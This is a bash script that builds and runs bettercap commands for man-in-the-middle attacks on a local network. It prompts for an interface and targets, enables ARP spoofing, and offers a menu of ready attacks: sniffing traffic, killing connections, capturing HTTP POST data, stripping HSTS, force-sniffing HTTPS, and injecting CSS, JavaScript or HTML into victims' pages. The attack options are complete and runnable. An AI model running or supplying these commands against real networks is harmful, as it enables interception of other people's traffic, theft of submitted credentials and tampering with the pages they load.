#explain goal, generate command -> mitm attack
echo "Generating command for MitM attack"
COMMAND="sudo bettercap"
#show interfaces
netstat -i
#ask interface
echo ""
echo "Type the interface you want to use,followed by [ENTER]:"
read interface
COMMAND=$COMMAND" -I "$interface
#ask if no-spoofing
echo ""
echo "Specify targets? [y/N]"
read target_yn
if [ "$target_yn" = "y" ]; 
then
	echo ""
	echo "Scan targets? [Y/n]"
	read scan_yn
	if [ "$scan_yn" != "n" ]; 
	then
		sh scan_networks.sh  
	fi
	echo ""
	echo "Specify targets (comma seperated or range -), followed by [ENTER]:"
	read targets
	COMMAND=$COMMAND" -T $targets"
fi
echo ""
echo "Do you want to reroute traffic on the network(spoofing), [Y/n]"
read spoof_yn
if [ "$spoof_yn" = "n" ]; 
then
	COMMAND=$COMMAND" --no-spoofing"
fi

echo""
echo "THIS IS THE BASE COMMAND:"
echo $COMMAND
echo ""
echo "Select an option:"
echo "(0) run this command"
echo "(1) see the traffic"
echo "(2) kill the traffic"
echo "(3) HTTP and HSTS attack + sniff"
echo "(4) Force sniff HTTPS traffic (loud)"
echo "(5) Make all pages pink"
echo "(6) Inject HACKED! js alert"
echo "(7) Display meme on all insecure pages"
echo "(8) Play Baby Youtube video"
echo "(c) custom command"
read option
echo "just a moment ..."
echo ""
if [ "$option" = "0" ]; then
	echo $COMMAND
	$(echo $COMMAND)
fi
if [ "$option" = "1" ]; then
	echo $COMMAND" -X"
	$(echo $COMMAND" -X")
fi
if [ "$option" = "2" ]; then
	echo $COMMAND" --kill"
	$(echo $COMMAND" --kill")
fi
if [ "$option" = "3" ]; then
	echo $COMMAND" --proxy -P POST"
	$(echo $COMMAND" --proxy -P POST")
fi
if [ "$option" = "4" ]; then
	echo $COMMAND" --proxy --proxy-https -P POST"
	$(echo $COMMAND" --proxy --proxy-https -P POST")
fi
if [ "$option" = "5" ]; then
	echo $(echo $COMMAND" --proxy-module injectcss --css-file injection_files/pink.css")
	$(echo $COMMAND" --proxy-module injectcss --css-file injection_files/pink.css")
fi
if [ "$option" = "6" ]; then
	echo $COMMAND" --proxy-module injectjs --js-data 'alert("HACKED!")'"
	$(echo $COMMAND" --proxy-module injectjs --js-data 'alert("HACKED!")'")
fi
if [ "$option" = "7" ]; then
	echo $COMMAND" --proxy-module injecthtml --html-file injection_files/hacked.html"
	$(echo $COMMAND" --proxy-module injecthtml --html-file injection_files/hacked.html")
fi
if [ "$option" = "8" ]; then
	echo $COMMAND" --proxy-module injecthtml --html-file injection_files/baby.html"
	$(echo $COMMAND" --proxy-module injecthtml --html-file injection_files/baby.html")
fi
if [ "$option" = "c" ]; then
	echo "type your custom command:"
	read custom
	echo ""
	echo $COMMAND" "$custom
	$(echo $COMMAND" "$custom)
fi
